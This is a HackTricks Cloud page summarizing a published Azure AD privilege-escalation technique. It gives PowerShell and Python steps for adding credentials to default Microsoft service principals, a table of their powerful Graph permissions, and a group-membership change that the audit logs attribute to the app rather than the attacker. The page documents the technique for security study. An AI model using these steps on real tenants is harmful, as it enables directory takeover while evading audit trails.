# Az - Default Applications

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

**This is a summary of the technique explained in** [**https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/**](https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/)

## Basic Information

Difference between an application and a Service Principal in Azure:

* **Application**: Configuration of an **application**
* **Service Principal**: Security object that can actually have **privileges** in the Azure Directory

The **Azure portal** calls Service Principals **"Enterprise Applications"** and **hides** most **properties** of the service principals from view.

For Office 365 and other **Microsoft applications**, the **Application** **definition** is present in one of Microsoft‚Äôs **dedicated Azure directories**.

{% hint style="danger" %}
In an Office 365 tenant, service principals are created for these applications automatically, giving an **Office 365 Azure AD about 200 service principals by default that all have different pre-assigned permissions**.
{% endhint %}

## Getting access to Microsoft Applications

An **Application Administrator** (or the **On-premise Sync account** if you are escalating from on-premise to the cloud) can **assign credentials to an application**, after which this application can log in using the **client credential grant** OAuth2 flow. Assigning credentials is possible using PowerShell:

```powershell
PS C:\> $sp = Get-AzureADServicePrincipal -searchstring "Microsoft StaffHub"
PS C:\> New-AzureADServicePrincipalPasswordCredential -objectid $sp.ObjectId -EndDate "31-12-2099 12:00:00" -StartDate "6-8-2018 13:37:00" -Value redactedpassword


CustomKeyIdentifier :
EndDate             : 31-12-2099 12:00:00
KeyId               :
StartDate           : 6-8-2018 13:37:00
Value               : redactedpassword
```

Then, you can log in and take a look at the issued access token. This **JWT displays the roles the application has in the Microsoft Graph**:

```python
import requests
import json
import jwt
import pprint

# This should include the tenant name/id
AUTHORITY_URL = 'https://login.microsoftonline.com/ericsengines.onmicrosoft.com'
TOKEN_ENDPOINT = '/oauth2/token'

data = {'client_id':'aa580612-c342-4ace-9055-8edee43ccb89',
        'resource':'https://graph.microsoft.com',
        'client_secret':'redactedpassword',
        'grant_type':'client_credentials'}

r = requests.post(AUTHORITY_URL + TOKEN_ENDPOINT, data=data)

data2 = r.json()

try:
    jwtdata = jwt.decode(data2['access_token'], verify=False)
    pprint.pprint(jwtdata)
except KeyError:
    pass
```

This will print the data from the token, containing the ‚ÄúRoles‚Äù field:

<pre class="language-json"><code class="lang-json">{
 "aio": "42FgYJg946pl8aLnJXPOnn4zTe/mBwA=",
 "app_displayname": "Microsoft StaffHub",
 "appid": "aa580612-c342-4ace-9055-8edee43ccb89",
 "appidacr": "1",
 "aud": "https://graph.microsoft.com",
 "exp": 1567200473,
 "iat": 1567171373,
 "idp": "https://sts.windows.net/50ad18e1-bb23-4466-9154-bc92e7fe3fbb/",
 "iss": "https://sts.windows.net/50ad18e1-bb23-4466-9154-bc92e7fe3fbb/",
 "nbf": 1567171373,
 "oid": "56748bde-f24d-4a5b-aa2d-c88b175dfc80",
<strong> "roles": ["Directory.ReadWrite.All",
</strong><strong>           "Mail.Read",
</strong><strong>           "Group.Read.All",
</strong><strong>           "Files.Read.All",
</strong><strong>           "Group.ReadWrite.All"],
</strong> "sub": "56748bde-f24d-4a5b-aa2d-c88b175dfc80",
 "tid": "50ad18e1-bb23-4466-9154-bc92e7fe3fbb",
 "uti": "2GScBJopwk2e3EFce7pgAA",
 "ver": "1.0",
 "xms_tcdt": 1559139940
}
</code></pre>

This method only seemed to work for the **Microsoft Graph** (and not for the Azure AD graph). I am unsure if this is because no apps have permissions on the Azure AD graph or if the system used for these permissions is different.

If we perform this action for all \~200 default apps in an Office 365 tenant, we get an overview of all the **permissions these applications have**. Below is an overview of the most interesting permissions that I‚Äôve identified.

| Application name                      | AppId                                | Access                              |
| ------------------------------------- | ------------------------------------ | ----------------------------------- |
| Microsoft Forms                       | c9a559d2-7aab-4f13-a6ed-e7e9c52aec87 | **Sites.ReadWrite.All**             |
| Microsoft Forms                       | c9a559d2-7aab-4f13-a6ed-e7e9c52aec87 | **Files.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Sites.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Sites.FullControl.All**           |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Files.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Group.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **User.ReadWrite.All**              |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **IdentityRiskyUser.ReadWrite.All** |
| Microsoft Teams                       | 1fec8e78-bce4-4aaf-ab1b-5451cc387264 | **Sites.ReadWrite.All**             |
| Microsoft StaffHub                    | aa580612-c342-4ace-9055-8edee43ccb89 | **Directory.ReadWrite.All**         |
| Microsoft StaffHub                    | aa580612-c342-4ace-9055-8edee43ccb89 | **Group.ReadWrite.All**             |
| Microsoft.Azure.SyncFabric            | 00000014-0000-0000-c000-000000000000 | **Group.ReadWrite.All**             |
| Microsoft Teams Services              | cc15fd57-2c6c-4117-a88c-83b1d56b4bbe | **Sites.ReadWrite.All**             |
| Microsoft Teams Services              | cc15fd57-2c6c-4117-a88c-83b1d56b4bbe | **Group.ReadWrite.All**             |
| Office 365 Exchange Online            | 00000002-0000-0ff1-ce00-000000000000 | **Group.ReadWrite.All**             |
| Microsoft Office 365 Portal           | 00000006-0000-0ff1-ce00-000000000000 | **User.ReadWrite.All**              |
| Microsoft Office 365 Portal           | 00000006-0000-0ff1-ce00-000000000000 | **AuditLog.Read.All**               |
| Azure AD Identity Governance Insights | 58c746b0-a0b0-4647-a8f6-12dde5981638 | **AuditLog.Read.All**               |
| Kaizala Sync Service                  | d82073ec-4d7c-4851-9c5d-5d97a911d71d | **Group.ReadWrite.All**             |

## Attack Summary

So the TL;DR is that if you compromise an **Application Administrator** account or the **on-premise Sync Account** you can read and **modify directory settings, group memberships, user accounts, SharePoint sites and OneDrive files**. This is done by **assigning credentials to an existing service principal** with these permissions and then impersonating these applications.

You can exploit this by **assigning a password or** [**certificate**](https://docs.microsoft.com/en-us/powershell/azure/active-directory/signing-in-service-principal?view=azureadps-2.0) **to a service principal** and then logging in as that service principal. I use Python for logging in with a service principal password since the PowerShell module doesn‚Äôt support this (it does support certificates but that‚Äôs more complex to set up).

The below command shows that when logging in with such a certificate, we do have the power to modify group memberships (something the application admin normally doesn‚Äôt have):

```powershell
PS C:\> add-azureadgroupmember -RefObjectId 2730f622-db95-4b40-9be7-6d72b6c1dad4 -ObjectId 3cf7196f-9d57-48ee-8912-dbf50803a4d8
PS C:\> Get-AzureADGroupMember -ObjectId 3cf7196f-9d57-48ee-8912-dbf50803a4d8

ObjectId                             DisplayName UserPrincipalName                 UserType
--------                             ----------- -----------------                 --------
2730f622-db95-4b40-9be7-6d72b6c1dad4 Mark        mark@bobswrenches.onmicrosoft.com Member
```

In the Azure AD audit log, the actions are shown as performed by ‚ÄúMicrosoft StaffHub‚Äù, and thus nothing in the log indicates these actions were actually performed by the application administrator.

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
